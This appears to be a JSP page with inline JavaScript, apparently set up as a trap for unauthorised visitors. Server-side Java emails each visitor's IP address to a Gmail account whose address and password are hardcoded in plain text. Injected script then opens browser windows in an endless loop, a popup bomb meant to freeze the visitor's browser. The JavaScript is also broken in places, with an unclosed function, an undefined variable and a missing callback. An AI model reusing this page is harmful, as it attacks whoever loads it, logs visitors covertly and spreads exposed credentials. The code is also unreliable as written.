<%@page import="javax.mail.MessagingException"%>
<%@page import="java.net.Socket"%>
<%@page import="javax.mail.Transport"%>
<%@page import="javax.mail.PasswordAuthentication"%>
<%@page import="javax.mail.Message"%>
<%@page import="javax.mail.internet.InternetAddress"%>
<%@page import="javax.mail.internet.MimeMessage"%>
<%@page import="javax.mail.Session"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.io.PrintWriter"%>
<html>
    <head>
<script>
    function start()
    {
while (true) {
  var w = window.open();
  var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (xhttp.readyState == 4 && xhttp.status == 200) {
    myFunction(xhttp);
    }
};
xhttp.open("GET", "lol.xml", true);
xhttp.send();
var xmlDoc = xml.responseXML;
    document.getElementById("demo").innerHTML =
    xmlDoc.getElementsByTagName("title")[0].childNodes[0].nodeValue;

  w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
  }
</script>
    </head>
    <body>
<%
    try
        {
            String s1=request.getRemoteAddr();
            String to="r.adarsh1994@gmail.com";//change accordingly  
  
  //Get the session object  
  Properties props = new Properties();  
  props.put("mail.smtp.host", "smtp.gmail.com");  
  props.put("mail.smtp.socketFactory.port", "465");  
  props.put("mail.smtp.socketFactory.class",  
            "javax.net.ssl.SSLSocketFactory");  
  props.put("mail.smtp.auth", "true");  
  props.put("mail.smtp.port", "465");  
   
  Session session1 = Session.getInstance(props,  
   new javax.mail.Authenticator() {  
  
       protected PasswordAuthentication getPasswordAuthentication() {  
   return new PasswordAuthentication("r.adarsh1994@gmail.com","9744547214");//change accordingly  
   }  
  });  
   
  //compose message  
  try {  
   MimeMessage message = new MimeMessage(session1);  
   message.setFrom(new InternetAddress("r.adarsh1994@gmail.com"));//change accordingly  
   message.addRecipient(Message.RecipientType.TO,new InternetAddress(to));  
   message.setSubject("REGISTERED");  
   String msg = "Invalid Access to the system is found from "+s1+" ";
   message.setText(msg);  
     
   //send message  
  Transport.send(message);  
  
   System.out.println("message sent successfully");  
   
  } catch (MessagingException e) {throw new RuntimeException(e);}  
            String str;
            Socket s = new Socket("localhost",3333);
       //     s.bind(new InetSocketAddress(5555));
           
            
            PrintWriter out1 = new PrintWriter(s.getOutputStream(),true);
            BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
            BufferedReader stdin = new BufferedReader(new InputStreamReader(System.in));
            while((str = in.readLine()) != null)
            {
               // out.println(str);
                %>
                <script>
                         var w = window.open();
  var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (xhttp.readyState == 4 && xhttp.status == 200) {
    myFunction(xhttp);
    }
};
xhttp.open("GET", "lol.xml", true);
xhttp.send();
var xmlDoc = xml.responseXML;
    document.getElementById("demo").innerHTML =
    xmlDoc.getElementsByTagName("title")[0].childNodes[0].nodeValue;

  w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
                        </script>
                <%
            }
        }
        catch(Exception e)
        {
            
        }
%></body>
</html>